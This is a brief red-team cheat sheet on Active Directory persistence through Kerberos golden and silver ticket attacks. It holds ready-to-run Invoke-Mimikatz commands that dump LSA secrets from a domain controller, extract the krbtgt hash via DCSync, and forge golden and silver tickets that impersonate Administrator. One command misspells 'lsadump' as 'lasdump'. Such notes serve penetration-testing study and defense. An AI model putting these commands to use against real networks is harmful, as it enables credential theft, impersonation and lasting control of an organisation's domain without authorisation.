PERSISTENCE TECHNIQUES
Golden Ticket Attack

A golden ticket is signed and encrypted by the hash of krbtgt account which makes it a valiod TGT ticket 

Since user account validation is not done by Domain Controller (KDC Service) until TGT is older than 20 minutes, we can even use deleted/revoked accounts

The KRBTGT user hash could be used to impersonate any user with any privileges from even a non-domain machine

Single Password Change has no effect on this attack

A Couple of examples of commands

Execute Mimikatz on DC

Invoke-Mimikatz -Command '"lasdump::lsa /patch"' -Computername dc01

Execute MimiKatz on any machine

Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:victim.local /sid:<domain sid> /krbtgt:<krbtgt ntlm hash> /id:500 /groups:513 /ptt"'

To use the DCSync feature for getting krbtgt hash, execute the below command with DA privileges for ops domain

Invoke-Mimikatz -Command '"lsadump::dcsync /user:victim.local\krbtgt"'



SIlver Ticket Attack

A Valid TGS (Golden Ticket is TGT)

Encrypted and Signed by the NTLM hash of the service account - (Golden Ticket is signed by the hash of the KRBTGT) of the service running with that account

Services rarely check PAC (Privileged Attribute Certificate)

Services will allow access only to the services themselves

Create Silver ticket

Invoke-MimiKatz -Command '"kerberos::golden /domain:victim.local /sid:<domain sid> /target:<target machine> /service:cifs /rc4:<NTLM hash of machine account> /id:500 /user:Administrator /ptt"'
